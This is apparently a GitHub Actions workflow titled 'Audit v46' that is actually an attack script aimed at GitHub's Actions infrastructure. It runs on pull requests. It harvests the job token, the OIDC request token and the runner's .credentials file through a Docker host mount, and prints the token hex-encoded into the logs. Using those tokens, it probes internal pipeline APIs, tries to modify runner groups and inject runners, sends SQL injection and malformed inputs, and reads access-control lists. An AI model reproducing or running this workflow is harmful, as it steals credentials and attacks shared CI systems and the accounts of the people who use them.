name: Audit v46
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v46:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V46 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: Find the API that GENERATES signed URLs
      # signedlogcontent validates signatures — some API returns them
      # Also: planLogs has a different path that may return signed URLs
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Signed URL generation
        if: always()
        env:
          RUNID: ${{ github.run_id }}
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== SIGNED URL GENERATION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)

          # A: planLogs — might return signed log URLs
          echo "--- A: planLogs (IDTOK) ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $IDTOK" \
            "$PIPE/_apis/pipelines/planLogs?planId=$PLAN")
          CODE=$(echo "$R" | tail -1)
          echo "A planLogs planId = $CODE | $(echo "$R" | sed '$d' | head -c 400)"
          echo ""

          # B: logs endpoint with signed=true or similar
          echo "--- B: Signed log requests ---"
          for EP in \
            "/_apis/pipelines/$RUNID/runs/1/logs?%24expand=signedContent" \
            "/_apis/pipelines/$RUNID/runs/1/logs?\$expand=signedContent" \
            "/_apis/pipelines/planLogs/$PLAN" \
            "/_apis/pipelines/planLogs?planId=$PLAN&api-version=6.0-preview" \
            "/_apis/pipelines/logs/$PLAN" \
            "/_apis/pipelines/logs?planId=$PLAN" \
            "/_apis/distributedtask/plans/$PLAN/logs?includeSignedContent=true" \
            "/_apis/distributedtask/plans/$PLAN/logs?api-version=6.0-preview" \
            "/_apis/distributedtask/logs?planId=$PLAN"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$PIPE$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "B $EP = $CODE | $(echo "$BODY" | head -c 300)"
          done
          echo ""

          # C: artifacts — might return signed download URLs
          echo "--- C: Artifacts + workflow artifacts ---"
          for EP in \
            "/_apis/pipelines/$RUNID/runs/1/artifacts" \
            "/_apis/pipelines/workflowArtifacts?planId=$PLAN" \
            "/_apis/pipelines/planArtifacts?planId=$PLAN" \
            "/_apis/pipelines/artifacts?planId=$PLAN" \
            "/_apis/pipelines/artifacts?runId=$RUNID"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$PIPE$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "C $EP = $CODE | $(echo "$BODY" | head -c 300)"
          done
          echo ""

          # D: summary + runinfo + live (might contain signed URLs)
          echo "--- D: Summary/runinfo ---"
          for EP in \
            "/_apis/pipelines/summary?planId=$PLAN" \
            "/_apis/pipelines/runinfo/$PLAN" \
            "/_apis/pipelines/runinfo?planId=$PLAN" \
            "/_apis/pipelines/live?planId=$PLAN" \
            "/_apis/pipelines/steps?planId=$PLAN" \
            "/_apis/pipelines/jobs?planId=$PLAN"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$PIPE$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "D $EP = $CODE | $(echo "$BODY" | head -c 300)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: Correct PATCH + runnerScaleSet + error bleed
      # v45: json-patch+json = 400 "source null" (CT accepted!)
      # v45: scaleset 400 "runnerScaleSet null"
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Correct formats + error bleed
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CORRECT FORMATS + ERROR BLEED ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"

          # A: JSON Patch format on runner group
          echo "--- A: JSON Patch ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json-patch+json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/runtime/runnergroups/1?api-version=6.0-preview" \
            -d '[{"op":"replace","path":"/name","value":"Modified-Default"}]')
          CODE=$(echo "$R" | tail -1)
          echo "A patch = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json-patch+json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/runtime/runnergroups/2?api-version=6.0-preview" \
            -d '[{"op":"add","path":"/runners/-","value":{"name":"v46-injected"}}]')
          CODE=$(echo "$R" | tail -1)
          echo "A patch g2 = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          echo ""

          # B: runnerScaleSet wrapper
          echo "--- B: Scale set with wrapper ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/runtime/runnerscalesets?api-version=6.0-preview" \
            -d '{"runnerScaleSet":{"name":"v46-ss","runnerGroupId":1,"labels":[{"name":"self-hosted"}]}}')
          CODE=$(echo "$R" | tail -1)
          echo "B wrapper = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # Try flat with correct field names
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/runtime/runnerscalesets?api-version=6.0-preview" \
            -d '{"runnerGroupId":1,"name":"v46-ss","labels":[{"type":"Custom","name":"self-hosted"}],"runnerSetting":{"isEphemeral":true},"createdOn":"2026-01-01T00:00:00Z"}')
          CODE=$(echo "$R" | tail -1)
          echo "B flat = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          echo ""

          # C: Error bleeding — trigger stack traces + info disclosure
          echo "--- C: Error bleed ---"
          # Integer overflow
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            "$PIPE/_apis/runtime/runnergroups/99999999999")
          CODE=$(echo "$R" | tail -1)
          echo "C overflow = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # Negative ID
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            "$PIPE/_apis/runtime/runnergroups/-1")
          CODE=$(echo "$R" | tail -1)
          echo "C negative = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # SQL injection in parameter
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            "$PIPE/_apis/distributedtask/pools?poolName=test'%20OR%201=1--")
          CODE=$(echo "$R" | tail -1)
          echo "C sqli = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # Large body to trigger error
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/runtime/runnergroups?api-version=6.0-preview" \
            -d "{\"name\":\"$(python3 -c "print('A'*10000)")\"}")
          CODE=$(echo "$R" | tail -1)
          echo "C bigname = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # Invalid JSON
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/runtime/runnergroups?api-version=6.0-preview" \
            -d '{invalid}')
          CODE=$(echo "$R" | tail -1)
          echo "C badjson = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # Null bytes in path
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            "$PIPE/_apis/distributedtask/pools%00admin")
          CODE=$(echo "$R" | tail -1)
          echo "C nullbyte = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          echo ""

          # D: Security namespace — leaked NamespaceId 333...
          echo "--- D: Security namespaces ---"
          for NS in \
            "33344d9c-fc72-4d6f-aba5-fa317101a7e9" \
            "2725d2bc-7520-4af4-b0e3-8d876494731f" \
            "00000000-0000-0000-0000-000000000000"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/security/SecurityNamespaces/$NS?api-version=5.0")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "D ns=$NS = $CODE | $(echo "$BODY" | head -c 200)"
          done

          # E: Access control listing
          echo "--- E: ACLs ---"
          for NS in \
            "33344d9c-fc72-4d6f-aba5-fa317101a7e9" \
            "2725d2bc-7520-4af4-b0e3-8d876494731f"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/security/AccessControlLists/$NS?api-version=5.0&includeExtendedInfo=true")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "E acl ns=$NS = $CODE | $(echo "$BODY" | head -c 300)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V46 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V46 COMPLETE ==="
